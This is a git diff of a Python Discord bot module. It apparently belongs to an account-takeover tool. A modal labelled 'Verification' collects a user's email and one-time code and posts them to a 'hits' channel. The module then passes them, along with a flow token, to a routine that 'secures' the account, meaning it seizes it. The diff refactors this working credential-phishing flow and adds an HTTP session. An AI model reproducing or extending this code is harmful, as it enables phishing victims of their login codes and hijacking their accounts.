@@ -1,13 +1,14 @@
 from discord import ui
 import datetime
 import discord
-import asyncio
+import httpx
 import json
 
-from views.buttons.buttonOptions import ButtonOptions
+from views.buttons.embedOptions import ButtonOptions
 from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
+from views.utils.initialSession import getSession
 
 config = json.load(open("config.json", "r+"))
 
@@ -32,7 +33,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         Code_embed = discord.Embed(
-            title = f"{interaction.user.name} | {interaction.user.id}",
+            title = f"User | {interaction.user.name}",
             description=f"**Email** | **Status**\n```{self.email} | Got Code | {self.box_three.value}```",
             timestamp = datetime.datetime.now(),
             colour = 0x79D990,                           
@@ -47,13 +48,15 @@ class MyModalTwo(ui.Modal, title="Verification"):
             "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
         )
 
-        finalEmbeds = await startSecuringAccount(self.email, self.flowtoken, self.box_three.value)
+        self.session = getSession()
+
+        finalEmbeds = await startSecuringAccount(self.session, self.email, self.flowtoken, self.box_three.value)
         
         if not finalEmbeds:
 
             await logs_channel.send(
                 embed = discord.Embed(
-                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    title = f"User | {interaction.user.name}({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid OTP Code```",
                     timestamp = datetime.datetime.now(),
                     colour = 0xFF5C5C                  
@@ -63,7 +66,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
             return
             
-        await hits_channel.send("**Successfully secured an account.**")
+        await hits_channel.send("**Successfully secured an account**")
         await hits_channel.send(
             embed = finalEmbeds[0],
             view = accountInfo(finalEmbeds[1], interaction.user)
